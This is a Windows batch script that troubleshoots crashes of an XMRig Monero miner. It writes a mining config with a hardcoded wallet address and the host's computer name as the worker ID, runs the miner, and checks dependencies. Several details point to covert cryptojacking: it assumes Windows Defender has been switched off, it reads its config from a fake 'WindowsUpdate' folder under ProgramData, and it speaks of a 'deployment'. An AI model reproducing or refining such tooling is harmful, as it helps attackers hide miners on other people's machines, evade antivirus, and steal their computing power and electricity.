@echo off
title DIAGNOSE MINER CRASH
color 0C

cd /d "%~dp0"

echo ================================================================
echo  DIAGNOSE WHY MINER IS CRASHING
echo  This will show the ACTUAL error message
echo ================================================================
echo.
echo Defender is OFF, but miner still crashes?
echo Let's see the real error...
echo.
pause

echo.
echo ================================================================
echo TEST 1: Check if xmrig.exe exists
echo ================================================================
if exist "xmrig.exe" (
    echo [OK] xmrig.exe found
) else (
    echo [ERROR] xmrig.exe NOT found!
    echo Please ensure xmrig.exe is in this folder
    pause
    exit
)

echo.
echo ================================================================
echo TEST 2: Run miner with --version (basic test)
echo ================================================================
xmrig.exe --version
if %ERRORLEVEL%==0 (
    echo [OK] Miner binary works
) else (
    echo [ERROR] Miner crashed on version check
    echo Possible cause: Missing Visual C++ Redistributable
    echo Download from: https://aka.ms/vs/17/release/vc_redist.x64.exe
    pause
    exit
)

echo.
echo ================================================================
echo TEST 3: Check config.json
echo ================================================================
if exist "C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json" (
    echo [OK] Config file exists
    echo.
    echo First 20 lines of config:
    powershell -Command "Get-Content 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json' -First 20"
) else (
    echo [WARN] Config file not found (will be created during deployment)
)

echo.
echo ================================================================
echo TEST 4: Run miner for 10 seconds with OUTPUT VISIBLE
echo ================================================================
echo This will show the REAL error message!
echo.
pause

echo.
echo Starting miner with visible output...
echo If it crashes, you'll see why!
echo.

REM Create a simple test config
echo {> test_config.json
echo   "autosave": true,>> test_config.json
echo   "cpu": {>> test_config.json
echo     "enabled": true,>> test_config.json
echo     "max-threads-hint": 50,>> test_config.json
echo     "priority": 2>> test_config.json
echo   },>> test_config.json
echo   "pools": [>> test_config.json
echo     {>> test_config.json
echo       "url": "gulf.moneroocean.stream:10128",>> test_config.json
echo       "user": "49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon",>> test_config.json
echo       "pass": "%COMPUTERNAME%",>> test_config.json
echo       "keepalive": true,>> test_config.json
echo       "tls": true>> test_config.json
echo     }>> test_config.json
echo   ]>> test_config.json
echo }>> test_config.json

echo.
echo Running miner with test config for 10 seconds...
echo.

timeout /t 2

REM Run miner with visible output
start /WAIT cmd /c "xmrig.exe --config=test_config.json & timeout /t 10"

echo.
echo.
echo ================================================================
echo Did you see an error message above?
echo ================================================================
echo.
echo Common errors:
echo  - "MEMORY ALLOC FAILED" = Enable huge pages or reduce threads
echo  - "failed to apply MSR mod" = MSR feature not available (OK to ignore)
echo  - "connect error" = Pool connection issue
echo  - "JSON parse error" = Config file is malformed
echo  - Crash with no message = Missing Visual C++ Redistributable
echo.
pause

echo.
echo ================================================================
echo TEST 5: Check for missing dependencies
echo ================================================================
echo.
echo Checking if Visual C++ Redistributable is installed...
reg query "HKLM\SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64" >nul 2>&1
if %ERRORLEVEL%==0 (
    echo [OK] Visual C++ 2015-2022 Redistributable found
) else (
    echo [ERROR] Visual C++ Redistributable NOT found!
    echo.
    echo This is likely why the miner crashes!
    echo.
    echo SOLUTION:
    echo Download and install from:
    echo https://aka.ms/vs/17/release/vc_redist.x64.exe
    echo.
    echo After installing, try running the deployment again.
    echo.
)

echo.
echo ================================================================
echo DIAGNOSIS COMPLETE
echo ================================================================
echo.
pause

REM Cleanup
del test_config.json 2>nul
